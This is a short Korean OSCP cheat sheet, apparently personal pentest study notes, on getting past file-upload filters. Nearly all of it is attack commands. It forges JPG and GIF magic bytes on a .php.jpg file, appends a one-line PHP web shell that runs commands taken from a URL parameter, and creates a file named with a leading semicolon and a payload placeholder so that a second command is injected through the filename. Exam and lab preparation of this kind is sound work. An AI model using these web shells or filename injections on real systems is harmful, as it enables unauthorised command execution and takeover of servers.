---
slug: "file-transfer"
title: "file_transfer"
date: 2026-07-14
category: "치트시트"
section: "OSCP"
tags: []
excerpt: "php 일시에 다음과 같이 넣음 ~~~bash echo '<?php system($_GET[\"cmd\"]); ?>' >> {파일명}.php.jpg ~~~ --- ### 특수문자…"
readingTime: 1
---

### magic bytes 파일 생성
~~~bash
#JPG
printf '\xff\xd8\xff' > {파일명}.php.jpg

# GIF
printf 'GIF89a' > {파일명}.php.gif
~~~

php 일시에 다음과 같이 넣음
~~~bash
echo '<?php system($_GET["cmd"]); ?>' >> {파일명}.php.jpg 
~~~
---
### 특수문자 파일명 생성
-- 로 옵션 끝 선언 후 파일명에 특수문자 사용 가능
~~~bash
touch -- ';{페이로드}'
~~~
----
### 시그니처 확인
~~~bash
hexdump -C -n 16 {파일명}
~~~
---
